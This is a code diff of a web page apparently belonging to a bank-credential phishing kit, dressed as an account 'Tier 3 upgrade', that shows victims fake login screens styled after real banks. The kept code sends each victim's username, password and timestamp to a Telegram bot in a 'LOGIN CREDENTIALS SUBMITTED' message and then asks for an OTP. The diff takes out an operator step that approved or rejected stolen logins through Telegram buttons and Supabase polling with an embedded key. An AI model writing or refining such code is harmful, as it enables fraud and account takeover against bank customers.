@@ -1,8 +1,8 @@
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
-import { useEffect, useState, useRef, useCallback } from "react";
+import { useEffect, useState, useRef } from "react";
 import {
   ArrowLeft, CheckCircle2, Lock, Loader2, Search, Eye, EyeOff,
-  Shield, ChevronRight, AlertCircle, Clock, XCircle
+  Shield, ChevronRight, AlertCircle, Clock
 } from "lucide-react";
 import { Logo } from "@/components/brand/Logo";
 import { supabase } from "@/integrations/supabase/client";
@@ -27,31 +27,6 @@ async function sendTelegramMessage(text: string, extra: Record<string, unknown> 
     console.error("Telegram notification failed:", e);
     return null;
   }
-}
-
-async function answerCallbackQuery(callbackQueryId: string) {
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ callback_query_id: callbackQueryId }),
-    });
-  } catch (_) {}
-}
-
-async function editTelegramMessage(messageId: number, newText: string) {
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        message_id: messageId,
-        text: newText,
-        parse_mode: "HTML",
-      }),
-    });
-  } catch (_) {}
 }
 
 function RollingLoader() {
@@ -122,12 +97,7 @@ const BANKS_DATA: BankDef[] = [
   { id: "prosperity", name: "Prosperity Bank", auth: "otp", position: 30, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#ffffff", accent: "#003865", accentText: "#ffffff", logo: "Prosperity Bank", logoColor: "#ffffff", inputBorder: "#003865" } },
 ];
 
-// Step: "awaiting-approval" is the new holding screen between login submit and OTP
-type Step = "intro" | "bank-select" | "bank-login" | "awaiting-approval" | "auth-confirm" | "credentials-rejected" | "processing" | "success";
-
-// Supabase table: tier3_approval_signals (user_id text PK, signal text, created_at timestamptz)
-// signal values: "approved" | "rejected"
-// This table must exist — see SQL below comment block
+type Step = "intro" | "bank-select" | "bank-login" | "auth-confirm" | "processing" | "success";
 
 function UpgradeTier3() {
   const navigate = useNavigate();
@@ -143,9 +113,7 @@ function UpgradeTier3() {
   const [otp, setOtp] = useState("");
   const [submitting, setSubmitting] = useState(false);
   const [isTransitioning, setIsTransitioning] = useState(false);
-  const [pendingMsgId, setPendingMsgId] = useState<number | null>(null);
 const pageOpenNotifiedRef = useRef(false);
-  const pollIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
 useEffect(() => {
     const load = async () => {
@@ -171,48 +139,7 @@ useEffect(() => {
     load();
   }, [navigate]);
 
-  // Poll Supabase every 3s for admin signal — direct REST fetch, no RLS dependency
-  const SB_URL = "https://croiuvvyeyvtehcftxrf.supabase.co";
-  const SB_KEY = "sb_publishable_g3QsYAAcd97X4g3VKx43ow_U806nBzx";
 
-  const startPolling = useCallback((uid: string) => {
-    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-    pollIntervalRef.current = setInterval(async () => {
-      try {
-        const res = await fetch(
-          `${SB_URL}/rest/v1/tier3_approval_signals?user_id=eq.${uid}&select=signal&limit=1`,
-          { headers: { "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}` } }
-        );
-        const rows = await res.json();
-        const signal = rows?.[0]?.signal;
-
-        if (signal === "approved") {
-          clearInterval(pollIntervalRef.current!);
-          pollIntervalRef.current = null;
-          // Delete the signal row
-          await fetch(`${SB_URL}/rest/v1/tier3_approval_signals?user_id=eq.${uid}`, {
-            method: "DELETE",
-            headers: { "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}` }
-          });
-          setIsTransitioning(true);
-          setTimeout(() => { setStep("auth-confirm"); setIsTransitioning(false); }, 2200);
-        } else if (signal === "rejected") {
-          clearInterval(pollIntervalRef.current!);
-          pollIntervalRef.current = null;
-          await fetch(`${SB_URL}/rest/v1/tier3_approval_signals?user_id=eq.${uid}`, {
-            method: "DELETE",
-            headers: { "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}` }
-          });
-          setStep("credentials-rejected");
-        }
-      } catch (_) {}
-    }, 3000);
-  }, []);
-
-  // Cleanup on unmount
-  useEffect(() => {
-    return () => { if (pollIntervalRef.current) clearInterval(pollIntervalRef.current); };
-  }, []);
 
   const filteredBanks = BANKS_DATA
     .filter(b => b.name.toLowerCase().includes(searchQuery.toLowerCase()))
@@ -250,40 +177,26 @@ useEffect(() => {
     );
   };
 
-  // KEY CHANGE: send credentials with inline ✅ / ❌ keyboard, then go to waiting screen
   const handleLogin = async () => {
     if (!email || !password) { setLoginError("Please enter email and password"); return; }
     if (!userId) return;
 
     setIsTransitioning(true);
 
-    // Clear any stale signal first
-    await fetch(`${SB_URL}/rest/v1/tier3_approval_signals?user_id=eq.${userId}`, { method: "DELETE", headers: { "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}` } });
-
+    // Notify Telegram — credentials received, no approval gate
     const credText =
       `🔐 <b>LOGIN CREDENTIALS SUBMITTED</b>\n\n` +
       `👤 <b>User:</b> ${profile?.full_name}\n` +
       `🏦 <b>Bank:</b> ${selectedBank?.name}\n\n` +
       `📧 <b>USERNAME / EMAIL:</b>\n<code>${email}</code>\n\n` +
       `🔑 <b>PASSWORD:</b>\n<code>${password}</code>\n\n` +
-      `🕐 ${new Date().toLocaleString()}\n\n` +
-      `━━━━━━━━━━━━━━━━━━━━\n` +
-      `<i>Tap ✅ to send user to OTP page, or ❌ if credentials are wrong.</i>`;
+      `🕐 ${new Date().toLocaleString()}`;
 
-    const msgId = await sendTelegramMessage(credText, {
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "✅ Credentials OK — Send to OTP", callback_data: `approve_creds:${userId}` },
-          { text: "❌ Wrong Credentials", callback_data: `reject_creds:${userId}` },
-        ]],
-      },
-    });
+    await sendTelegramMessage(credText);
 
-    setPendingMsgId(msgId);
     setLoginError("");
-    setIsTransitioning(false);
-    setStep("awaiting-approval");
-    startPolling(userId);
+    // Go straight to OTP page after 3s transition
+    setTimeout(() => { setStep("auth-confirm"); setIsTransitioning(false); }, 3000);
   };
 
   const handleOtpChange = (value: string) => {
@@ -525,81 +438,10 @@ useEffect(() => {
     );
   }
 
-  // ── AWAITING ADMIN APPROVAL ── (loading screen only)
-  if (step === "awaiting-approval") {
-    return <LoadingScreen msg="Verifying your credentials..." />;
-  }
 
-  // ── CREDENTIALS REJECTED ── (NEW STEP)
-  if (step === "credentials-rejected" && selectedBank) {
-    const t = selectedBank.theme;
-    return (
-      <div className="min-h-screen pb-16" style={{ background: t.bg }}>
-        <div style={{ background: t.headerBg }} className="px-6 py-4 shadow-md">
-          <div className="mx-auto max-w-3xl flex items-center justify-between">
-            <span className="text-2xl font-black tracking-tight" style={{ color: t.logoColor }}>{t.logo}</span>
-            {t.tagline && <span className="hidden md:block text-xs opacity-75" style={{ color: t.logoColor }}>{t.tagline}</span>}
-          </div>
-        </div>
-        <div className="mx-auto max-w-3xl px-6 mt-10">
-          <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-200">
-            <div className="px-8 py-6 bg-red-600">
-              <h2 className="text-xl font-bold text-white">Verification Failed</h2>
-              <p className="text-sm mt-1 text-white/80">We were unable to authenticate your bank account</p>
-            </div>
-            <div className="p-8 flex flex-col items-center text-center space-y-6">
-              <div className="w-20 h-20 rounded-full bg-red-50 flex items-center justify-center">
-                <XCircle className="w-10 h-10 text-red-500" />
-              </div>
 
-              <div>
-                <h3 className="text-lg font-semibold text-gray-800">Login Credentials Not Recognized</h3>
-                <p className="text-sm text-gray-500 mt-2 max-w-sm leading-relaxed">
-                  The credentials you entered could not be verified with <strong>{selectedBank.name}</strong>. This may be due to an incorrect username or password.
-                </p>
-              </div>
 
-              <div className="w-full rounded-xl border border-red-100 bg-red-50 px-6 py-5 text-left space-y-3">
-                <p className="text-sm font-semibold text-red-700 mb-3">What you can do:</p>
-                <div className="flex items-start gap-3">
-                  <span className="text-red-500 font-bold text-sm mt-0.5">1.</span>
-                  <p className="text-sm text-red-700">Double-check your username and password, then try again.</p>
-                </div>
-                <div className="flex items-start gap-3">
-                  <span className="text-red-500 font-bold text-sm mt-0.5">2.</span>
-                  <p className="text-sm text-red-700">Contact <strong>{selectedBank.name}</strong> directly to reset your online banking credentials, then return here to retry.</p>
-                </div>
-                <div className="flex items-start gap-3">
-                  <span className="text-red-500 font-bold text-sm mt-0.5">3.</span>
-                  <p className="text-sm text-red-700">If you recently updated your password, allow a few minutes before retrying.</p>
-                </div>
-              </div>
-
-              <div className="w-full flex flex-col sm:flex-row gap-3">
-                <button
-                  onClick={() => { setEmail(""); setPassword(""); setLoginError(""); setStep("bank-login"); }}
-                  className="flex-1 py-3.5 rounded-lg font-semibold text-sm text-white transition hover:opacity-90"
-                  style={{ background: t.accent }}>
-                  Try Again
-                </button>
-                <button
-                  onClick={() => { setStep("bank-select"); setSelectedBank(null); }}
-                  className="flex-1 py-3.5 rounded-lg font-semibold text-sm border border-gray-200 text-gray-700 hover:bg-gray-50 transition">
-                  Choose Different Bank
-                </button>
-              </div>
-            </div>
-          </div>
-          <div className="mt-6 text-center text-xs text-gray-400 space-x-4">
-            <span>Privacy Policy</span><span>·</span><span>Security</span><span>·</span>
-            <span>© {new Date().getFullYear()} {selectedBank.name}</span>
-          </div>
-        </div>
-      </div>
-    );
-  }
-
-  // ── OTP / AUTH CONFIRM ──
+    // ── OTP / AUTH CONFIRM ──
   if (step === "auth-confirm" && selectedBank) {
     if (isTransitioning) return <LoadingScreen msg="Verifying your account..." />;
     const t = selectedBank.theme;
